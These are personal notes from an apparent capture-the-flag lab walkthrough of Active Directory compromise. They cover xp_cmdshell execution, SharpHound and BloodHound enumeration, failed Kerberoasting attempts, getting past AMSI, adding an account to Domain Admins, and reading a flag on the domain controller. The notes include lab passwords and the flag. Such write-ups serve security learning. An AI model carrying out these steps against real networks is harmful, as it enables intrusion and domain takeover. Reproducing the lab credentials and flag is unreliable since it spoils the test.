Info:

```bash
impacket-mssqlclient admin2@compatibility.intranet.poo
# bJcQ_SjF3PsnmqmLjhG!
```

```bash
evil-winrm -i compatibility.intranet.poo -u 'Administrator' -p 'EverybodyWantsToWorkAtP.O.O.'
```

# AD enum

Via evil-winrm upload SharpHound:
```powershell
upload SharpHound.exe
```

The local administrator account cant enumerate the AD, but the MSSSQL service is likely a managed service account or can impersonate the machine account and thus enum the domain:
```sql
EXEC xp_cmdshell 'C:\Users\Public\SharpHound.exe -c All --outputdirectory C:\Users\Public';
```

Download the results and open them in BloodHound:
```
download 20251127184332_BloodHound.zip
```

Domain Admins:
![[Pasted image 20251127174909.png]]
=> MR3KS

Kerberoastable users:
![[Pasted image 20251127175016.png]]

Shortest Paths to Domain Admins from Kerberoastable users:
![[Pasted image 20251127175207.png]]
=> P00_ADM is a member of the Help Desk group which has privs on the Domain Admins group, i.e. P00_ADM can add users to the DA group.

# Kerberoasting

Upload Rubeus:
```
upload Rubeus.exe
```

Run Rubeus via the MSSQL shell:
```sql
EXEC xp_cmdshell 'C:\Users\Public\Rubeus.exe kerberoast /user:p00_adm';
```
=> Cant execute?? The official solution doesnt work?

See:
```
.\Rubeus.exe kerberoast /user:p00_adm
Program 'Rubeus.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software
```

## My alternative

Get SPNs
```sql
exec xp_cmdshell 'powershell.exe -c "Get-ADUser -Filter ''ServicePrincipalName -like \"*\"'' -Properties ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName';

-- SamAccountName ServicePrincipalName                
-- -------------- --------------------                
-- krbtgt         {kadmin/changepw}                   
-- p00_hr         {HR_peoplesoft/intranet.poo:1433}   
-- p00_adm        {cyber_audit/intranet.poo:443}
```

Request kerberos ticket via powerview:
```sql
-- request all kerberoastable tickets 
EXEC xp_cmdshell 'powershell.exe -ep Bypass -c "Import-Module C:\Tools\PowerView.ps1; Invoke-Kerberoast"';
-- Import-Module : Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```
=> doesnt work

Continue with the pw from the solution:
`p00_adm:ZQ!5t4r`

# PowerView

Copy PowerView.ps1 to CWD, then run:
```bash
evil-winrm -i compatibility.intranet.poo -u 'Administrator' -p 'EverybodyWantsToWorkAtP.O.O.' -s .
```

Bypass AMSI and import PowerView.ps1:
```
PS> Bypass-4MSI
PS> PowerView.ps1
```

# Add p00_adm to DA group

Since p00_adm is a group member of 'P00 HELP DESK', which has 'GenericAll' perms on the group 'Domain Admins', we can add him to the group and thus make him a DA:

```Powershell
# Create credentials object
$pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)

# PowerView function to add AD group member
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred

# Check if p00_adm was added to the DA group
Get-DomainUser p00_adm -Credential $cred

# ...
# samaccountname                : p00_adm
# ...
# memberof                      : {CN=P00 Help Desk,CN=Users,DC=intranet,DC=poo, CN=Domain Admins,CN=Users,DC=intranet,DC=poo}
# ...
```
=> Successfully added p00_adm to DA!

# CMD execution on DC

Use PS native cmdlet 'Invoke-Command' to execute a command on the DC:
```Powershell
Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami; hostname }

# poo\p00_adm
# DC
```

Search for the flag:
```Powershell
Invoke-Command -Computer DC -Credential $cred -ScriptBlock { Get-ChildItem -Recurse C:\Users -Include flag.txt }

# C:\Users\mr3ks\Desktop\flag.txt
```

Get the flag:
```Powershell
Invoke-Command -Computer DC -Credential $cred -ScriptBlock { cat C:\Users\mr3ks\Desktop\flag.txt }

# POO{1196ef8bc523f084ad1732a38a0851d6}
```

Cleanup: Remove p00_adm from DA:
```Powershell
Invoke-Command -Computer DC -Credential $cred -ScriptBlock { net group "Domain Admins" p00_adm /del }
```